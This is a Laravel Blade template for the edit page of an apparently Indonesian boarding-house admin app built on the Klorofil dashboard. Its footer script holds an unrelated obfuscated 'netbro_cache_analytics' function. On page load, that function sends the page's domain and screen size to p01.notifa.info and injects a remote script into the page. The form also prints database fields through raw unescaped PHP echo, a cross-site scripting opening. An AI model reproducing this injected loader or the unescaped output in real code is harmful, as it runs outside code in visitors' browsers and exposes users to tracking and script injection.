@extends('template')
@section('header')
<link rel="stylesheet" href="{{asset('assets/css/bootstrap.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/vendor/font-awesome/css/font-awesome.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/vendor/linearicons/style.css')}}">
<link rel="stylesheet" href="{{asset('assets/vendor/bootstrap/css/bootstrap.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/vendor/chartist/css/chartist-custom.css')}}">

<!-- MAIN CSS -->
<link rel="stylesheet" href="{{asset('assets/css/main.css')}}">

<!-- FOR DEMO PURPOSES ONLY. You should remove this in your project -->
<link rel="stylesheet" href="{{asset('assets/css/demo.css')}}">

<!-- GOOGLE FONTS -->
<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700" rel="stylesheet">

<!-- ICONS -->
<link rel="apple-touch-icon" sizes="76x76" href="{{asset('assets/img/apple-icon.png')}}">
<link rel="icon" type="image/png" sizes="96x96" href="{{asset('assets/img/favicon.png')}}">
@endsection
@section('navbar')
<nav class="navbar navbar-default navbar-fixed-top">
	<div class="brand">
		<a href="index.html"><img src="{{asset('assets/img/logo-dark.png')}}" alt="Klorofil Logo"
				class="img-responsive logo"></a>
	</div>
	<div class="container-fluid">
		<div class="navbar-btn">
			<button type="button" class="btn-toggle-fullwidth"><i class="lnr lnr-arrow-left-circle"></i></button>
		</div>
		<form class="navbar-form navbar-left">
			<div class="input-group">
				<input type="text" value="" class="form-control" placeholder="Search dashboard...">
				<span class="input-group-btn"><button type="button" class="btn btn-primary">Go</button></span>
			</div>
		</form>

		<div id="navbar-menu">
			<ul class="nav navbar-nav navbar-right">
				<li class="dropdown">
					<a href="#" class="dropdown-toggle icon-menu" data-toggle="dropdown">
						<i class="lnr lnr-alarm"></i>
						<span class="badge bg-danger">5</span>
					</a>
					<ul class="dropdown-menu notifications">
						<li><a href="#" class="notification-item"><span class="dot bg-warning"></span>System space is
								almost full</a></li>
						<li><a href="#" class="notification-item"><span class="dot bg-danger"></span>You have 9
								unfinished tasks</a></li>
						<li><a href="#" class="notification-item"><span class="dot bg-success"></span>Monthly report is
								available</a></li>
						<li><a href="#" class="notification-item"><span class="dot bg-warning"></span>Weekly meeting in
								1 hour</a></li>
						<li><a href="#" class="notification-item"><span class="dot bg-success"></span>Your request has
								been approved</a></li>
						<li><a href="#" class="more">See all notifications</a></li>
					</ul>
				</li>
				<li class="dropdown">
					<a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="lnr lnr-question-circle"></i>
						<span>Help</span> <i class="icon-submenu lnr lnr-chevron-down"></i></a>
					<ul class="dropdown-menu">
						<li><a href="#">Basic Use</a></li>
						<li><a href="#">Working With Data</a></li>
						<li><a href="#">Security</a></li>
						<li><a href="#">Troubleshooting</a></li>
					</ul>
				</li>
				<li class="dropdown">
					<a href="#" class="dropdown-toggle" data-toggle="dropdown"><img
							src="{{asset('')}}../../assets/img/user.png" class="img-circle" alt="Avatar">
						<span>Samuel</span> <i class="icon-submenu lnr lnr-chevron-down"></i></a>
					<ul class="dropdown-menu">
						<li><a href="#"><i class="lnr lnr-user"></i> <span>My Profile</span></a></li>
						<li><a href="#"><i class="lnr lnr-envelope"></i> <span>Message</span></a></li>
						<li><a href="#"><i class="lnr lnr-cog"></i> <span>Settings</span></a></li>
						<li><a href="#"><i class="lnr lnr-exit"></i> <span>Logout</span></a></li>
					</ul>
				</li>
				<!-- <li>
					<a class="update-pro" href="https://www.themeineed.com/downloads/klorofil-pro-bootstrap-admin-dashboard-template/?utm_source=klorofil&utm_medium=template&utm_campaign=KlorofilPro" title="Upgrade to Pro" target="_blank"><i class="fa fa-rocket"></i> <span>UPGRADE TO PRO</span></a>
				</li> -->
			</ul>
		</div>
	</div>
</nav>
@endsection

@section('sidebar')
<div id="sidebar-nav" class="sidebar">
	<div class="sidebar-scroll">
		<nav>

			<ul class="nav">
				<li><a href="index.html" class="active"><i class="lnr lnr-home"></i> <span>Dashboard</span></a></li>

				<li><a href="elements.html" class=""><i class="lnr lnr-code"></i> <span>Elements</span></a></li>

				<li><a href="charts.html" class=""><i class="lnr lnr-chart-bars"></i> <span>Charts</span></a></li>

				<li><a href="panels.html" class=""><i class="lnr lnr-cog"></i> <span>Panels</span></a></li>

				<li><a href="notifications.html" class=""><i class="lnr lnr-alarm"></i> <span>Notifications</span></a>
				</li>


				<li>
					<a href="#subPages" data-toggle="collapse" class="collapsed"><i class="lnr lnr-file-empty"></i>
						<span>Pages</span> <i class="icon-submenu lnr lnr-chevron-left"></i></a>
					<div id="subPages" class="collapse ">
						<ul class="nav">
							<li><a href="page-profile.html" class="">Profile</a></li>
							<li><a href="page-login.html" class="">Login</a></li>
							<li><a href="page-lockscreen.html" class="">Lockscreen</a></li>
						</ul>
					</div>
				</li>

				<li><a href="tables.html" class=""><i class="lnr lnr-dice"></i> <span>Tables</span></a></li>

				<li><a href="typography.html" class=""><i class="lnr lnr-text-format"></i> <span>Typography</span></a>
				</li>

				<li><a href="icons.html" class=""><i class="lnr lnr-linearicons"></i> <span>Icons</span></a></li>


			</ul>
		</nav>
	</div>
</div>
@endsection
@section('overview')

<body>
	<div class="panel">
		<div class="panel-body">
			<form action="{{url('/edit')}}" method="post">
				{{ csrf_field() }}
				<input type="hidden" value="<?php echo $get_where[0]->id ?>" name="id" id="">
				<input type="text" class="form-control" value="<?php echo $get_where[0]->nama_kost ?>" name="nama_kost"
					placeholder="Nama Kost"><br>
				<textarea class="form-control" name="alamat_kost" placeholder="Alamat Kost"
					rows="4"><?php echo $get_where[0]->alamat ?></textarea><br>
				<label for="">Fasilitas</label>
				<?php $no = 1 ?>
				@foreach ($fasilitas as $fas)
				<label class="fancy-checkbox">
					<input type="checkbox" name="fasilitas[]" value="{{$fas->id}}">
					<span>{{$fas->nama_fasilitas}}</span>
				</label>
				@endforeach
				<br>
				<input type="text" class="form-control" value="<?php echo $get_where[0]->harga ?>" name="harga"
					placeholder="Harga Kost"><br>
				<button type="submit" class="btn btn-primary">Submit</button>
			</form>
		</div>
	</div>
	@endsection
	@section('footer')
	<script src="{{asset('assets/vendor/jquery/jquery.min.js')}}"></script>
	<script src="{{asset('assets/vendor/bootstrap/js/bootstrap.min.js')}}"></script>
	<script src="{{asset('assets/vendor/jquery-slimscroll/jquery.slimscroll.min.js')}}"></script>
	<script src="{{asset('assets/vendor/jquery.easy-pie-chart/jquery.easypiechart.min.js')}}"></script>
	<script src="{{asset('assets/vendor/chartist/js/chartist.min.js')}}"></script>
	<script src="{{asset('assets/scripts/klorofil-common.js')}}"></script>
	<script type="text/javascript">
		if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2nos4el7UXQRMEfrHfUT2N4FZvB3366QnmmYMGDmth6fJp5XXwdz9%2fJXbtNcJHHXYzWiByajNPZiPfwzZYmV1c6U5%2bi%2brdyolWu%2bT%2fcNUSmPWTGrPb0Oyj6efykswvkW6Ms6SvV8rzItDCaNCUZJ6EdbYciqV%2fTyukLP6IlT9INBQkh1pAE3h0jYBH96uSI30Owhlxq2xudPH7%2fEnCKpi1Pso1WEPxUellReZUTZPHD358s78h2GG6cxBqpB6Lg4wgvrH6x0ruU4PBRyDFXHPwQGIyGHyI4bp%2f642iG4whNylF%2fvuXZNH6v%2bnXW9qdoQfWFbbEIfBvFfgSHH7koJtUFAwA%2f8vQTsA1TsgqyNLAibfnWCXYzjfLINvmH0eoAprJXFbNfZBf9pdIHw0ld6lH9V%2fuBeQS0knolCYNnMINbe6SYoy%2bslL%2bbt3Is506L13YZUyjKTLiBIhCWyj7g0KCM846lp5megA5x5emnxYHSbHmeeXwoDIU5O9Yk4UpYYYkmTb27ft%2fTevPOMpfi%2bqcBBYRJaVo%2fJQjZEMxF4J1tlkXXp7zQwZcCd09ZlGeVKSA0jN%2fGvzdA2epaCVrc542qNLGZwX8YSyEAC%2blnE6dUc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
	</script>
	@endsection